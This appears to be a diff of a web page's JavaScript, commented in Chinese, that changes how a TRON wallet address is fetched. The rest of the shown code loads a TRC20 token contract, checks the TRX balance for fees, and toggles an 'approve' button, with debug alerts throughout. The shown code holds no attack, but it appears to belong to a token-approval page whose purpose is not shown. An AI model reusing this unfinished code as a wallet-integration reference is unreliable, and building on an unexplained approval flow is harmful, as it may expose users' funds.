@@ -107,40 +107,39 @@
         await initWallet(); // 在此处调用 initWallet 函数
     };
 
-    async function initWallet() {
-        alert("initWallet 函数被调用");
-        try {
-            // 使用 tronWeb.request 方法获取用户地址
-            const accounts = await tronWeb.request({ method: 'tron_getAddresses' });
-            userAddress = accounts[0];
-            alert("userAddress: " + userAddress);
-            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-            alert("trc20Contract 对象已正确初始化");
+   async function initWallet() {
+    alert("initWallet 函数被调用");
+    try {
+        // 使用 tronWeb.tron.getAddresses 方法获取用户地址
+        const accounts = await tronWeb.tron.getAddresses();
+        userAddress = accounts[0];
+        alert("userAddress: " + userAddress);
+        trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+        alert("trc20Contract 对象已正确初始化");
 
-            // 检查 TRX 余额
-            const trxBalance = await getTrxBalance(userAddress);
-            alert("trxBalance: " + trxBalance); // 添加此行
-            if (trxBalance < 1) { // 假设需要至少 1 TRX
-                document.getElementById("trxInfo").innerHTML = `
-                    <div style="color: red; text-align: center;">
-                        ⚠️ TRX 余额不足，请确保钱包中有足够的 TRX 以支付交易手续费。
-                    </div>
-                `;
-                document.getElementById("approveBtn").disabled = true;
-            } else {
-                document.getElementById("trxInfo").innerHTML = "";
-                document.getElementById("approveBtn").disabled = false;
-            }
-
-            document.getElementById("userInfo").innerHTML = `
-                已连接：<br>
-                ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}
+        // 检查 TRX 余额
+        const trxBalance = await getTrxBalance(userAddress);
+        alert("trxBalance: " + trxBalance); // 添加此行
+        if (trxBalance < 1) { // 假设需要至少 1 TRX
+            document.getElementById("trxInfo").innerHTML = `
+                <div style="color: red; text-align: center;">
+                    ⚠️ TRX 余额不足，请确保钱包中有足够的 TRX 以支付交易手续费。
+                </div>
             `;
-        } catch (e) {
-            alert("钱包初始化失败：" + e.message);
+            document.getElementById("approveBtn").disabled = true;
+        } else {
+            document.getElementById("trxInfo").innerHTML = "";
+            document.getElementById("approveBtn").disabled = false;
         }
-    }
 
+        document.getElementById("userInfo").innerHTML = `
+            已连接：<br>
+            ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}
+        `;
+    } catch (e) {
+        alert("钱包初始化失败：" + e.message);
+    }
+}
     // 查USDT余额
     async function getTokenBalance(address) {
         alert("getTokenBalance 函数被调用，address: " + address);
